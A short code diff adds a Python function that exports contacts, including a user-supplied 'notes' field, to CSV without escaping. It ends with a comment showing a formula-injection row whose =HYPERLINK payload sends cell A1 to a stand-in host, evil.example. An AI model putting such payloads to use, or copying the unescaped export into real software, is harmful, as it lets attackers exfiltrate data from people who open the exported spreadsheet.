@@ -1,0 +1,12 @@
+import csv
+
+def export_contacts(contacts, response):
+    writer = csv.writer(response)
+    writer.writerow(["Name", "Email", "Notes"])
+    for contact in contacts:
+        # contact.notes is a free-text field a user filled in on their profile
+        writer.writerow([contact.name, contact.email, contact.notes])
+    return response
+
+# Example row a user submitted through the profile "notes" field:
+# "Alice","alice@example.com","=HYPERLINK(""http://evil.example/?d=""&A1,""Click"")"
